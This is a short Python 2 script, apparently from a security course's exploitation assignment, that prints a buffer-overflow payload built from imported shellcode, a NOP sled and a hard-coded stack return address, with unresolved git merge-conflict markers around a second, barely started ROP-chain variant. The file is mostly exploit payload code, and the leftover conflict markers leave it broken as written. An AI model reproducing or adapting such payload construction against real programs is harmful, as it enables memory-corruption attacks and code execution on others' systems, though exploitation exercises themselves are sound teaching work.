#!/usr/bin/env python2

<<<<<<< HEAD
from shellcode import shellcode
from struct import pack

# Padding goes here
p = pack('<I', 0x40000000)+ shellcode +"\x90"*37 + "\x60\xe7\xfe\xbf"
=======
from struct import pack

# Padding goes here
p = ""

p += pack('<I', 0x80);

#p += pack('<I', 0x0805dcaa) # pop edx ; ret
>>>>>>> target8

print p
